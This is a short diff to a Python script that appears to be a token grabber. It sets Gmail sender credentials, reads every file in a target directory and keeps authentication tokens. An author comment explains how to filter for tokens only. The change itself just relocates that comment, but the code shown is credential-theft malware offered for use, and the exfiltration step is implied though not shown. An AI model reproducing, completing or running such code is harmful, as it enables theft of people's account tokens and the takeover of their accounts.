@@ -1,4 +1,5 @@
-﻿# - AhmedViruso@Hotmail.Com
+# - AhmedViruso@Hotmail.Com
+# You Can Add [if(len(x) < 20): continue] for get tokens only , or add X[-1] For Get Last Token ...
 
 Us = "Your Gmail Address"
 Pw = "Your Gmail Password"
@@ -40,7 +41,6 @@ try:
     A = glob.glob("*")
     for i in A:
         try:
-            # You Can Add [if(len(x) < 20): continue] for get tokens only , or add X[-1] For Get Last Token
             F = open(Path+"/"+"".join(i), 'rb')
             Text = F.read()
             Text = str(Text).replace("-","Microsoft1")
